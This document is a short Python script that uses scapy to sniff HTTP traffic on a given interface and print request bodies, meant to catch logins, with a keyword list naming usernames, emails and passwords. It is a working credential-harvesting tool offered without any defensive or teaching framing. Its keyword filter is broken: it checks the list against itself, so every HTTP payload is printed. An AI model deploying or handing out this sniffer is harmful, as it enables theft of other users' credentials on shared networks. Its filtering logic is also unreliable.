import scapy.all as scapy
import argparse
from scapy.layers import http

keywords = ['username', 'uname', 'login', 'email', 'passwd', 'password', 'pass']

def procces_sniffed_package(package):
    if package.haslayer(http.HTTPRequest):
        if(package.haslayer(scapy.Raw)):
            load = package[scapy.Raw].load.decode('utf-8')
            if any([(keywd in keywords) for keywd in keywords]):
                print(load)
        

def sniff(interface):
    scapy.sniff(
        iface=interface,
        store=False,
        prn=procces_sniffed_package,
    )

argparser = argparse.ArgumentParser()
argparser.add_argument('-i', type=str, dest='i', help='Interface name')
args = argparser.parse_args()

try:
    sniff(args.i)
    print(f"Sniffing interface {args.i} is running")
except KeyboardInterrupt:
    print("Aborted by keyboard")